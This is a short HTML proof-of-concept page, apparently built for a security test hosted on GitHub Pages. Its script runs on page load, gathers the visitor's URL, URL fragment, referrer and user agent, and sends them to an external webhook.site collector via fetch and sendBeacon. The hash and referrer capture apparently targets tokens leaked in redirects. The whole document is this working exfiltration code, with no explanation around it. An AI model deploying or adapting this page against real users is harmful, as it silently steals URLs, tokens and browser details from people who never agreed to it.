<!doctype html>
<html>
<head><meta charset="utf-8"><title>PoC Capture</title></head>
<body>
  <h3>PoC capture running</h3>
  <pre id="out"></pre>
<script>
(function(){
  const out = document.getElementById('out');
  const payload = {
    href: location.href,
    hash: location.hash || "",
    referrer: document.referrer || "",
    ua: navigator.userAgent
  };
  out.textContent = JSON.stringify(payload, null, 2);

  // kirim ke webhook.site (ganti ID)
  const webhook = "https://webhook.site/d1233caa-6311-47e6-886e-293c7de27c5d";
  // kirim via GET supaya mudah lihat di logs
  fetch(webhook + "?from=ghpages&ref=" + encodeURIComponent(payload.referrer) +
        "&hash=" + encodeURIComponent(payload.hash) +
        "&u=" + encodeURIComponent(payload.href) +
        "&ua=" + encodeURIComponent(payload.ua)).catch(()=>{});
  // juga coba sendBeacon
  try { navigator.sendBeacon && navigator.sendBeacon(webhook, JSON.stringify(payload)); } catch(e){}
})();
</script>
</body>
</html>
